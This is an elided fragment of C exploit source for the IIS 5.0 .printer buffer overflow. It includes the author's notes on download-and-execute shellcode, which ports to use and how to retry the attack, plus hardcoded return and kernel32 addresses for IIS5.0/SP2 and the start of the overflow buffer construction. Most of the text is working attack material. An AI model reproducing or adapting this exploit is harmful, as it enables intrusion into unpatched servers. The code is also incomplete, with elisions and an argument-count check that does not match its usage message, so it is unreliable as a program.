...
added offsets et al by afx	: 01.06.29 
afx:
	note this is download and execute shellcode, the file to be executed
	must exist on the machine you're running the sploit on (this is not
	an http download and execute). good ports to use are 443 and 53
	(just make sure you're not running a bind/dns daemon or SSL on your
	local machine).

	also, this sploit might require a few tries - fortunately IIS5.0
	restarts itself so you can have a few whacks at it... normally for
	whatever reason, I've found that I can exploit the machine *once*
	before a genuine reboot (not service restart). Maybe try the other
	addresses for GetProcAddress & GetModuleHandleA - the ones I've
	put in as default are for IIS5.0/SP2, current up until .printer
	overflow hotfix.

	ciao... ;)
	  afx@superhackpimp.net
...
#define RET                 0x77e816de  /* jmp or call ebx */
#define GMHANDLEA           0x77e86c42  /* Address of GetModuleHandleA - afx: try 0x77e56c42 as well */
#define GPADDRESS           0x77e89ac1  /* Address of GetProcAddress - afx: try 0x77e589ac1 as well */
/* The kernel32.dll library addresses change a bit on different sp's/hotfix levels - haven't tried all of them */
...
int main(int argc,char *argv[])
{
    ...
    if(argc!=3)
    {
        printf("usage: $ %s ip file listen_port\n",argv[0]);
        return -1;
    }
    if((fp=fopen(argv[2],"rb"))==0)
    {
        printf("download file does not exist.\n");
        return -2;
    }
    ...
    if(pid)
    {
        ...
        *p++ = 1;
        ...
        memcpy(&buf2[sizeof(buf2)-strlen(shellcode)-strlen(storage)
-1],storage,strlen(storage));
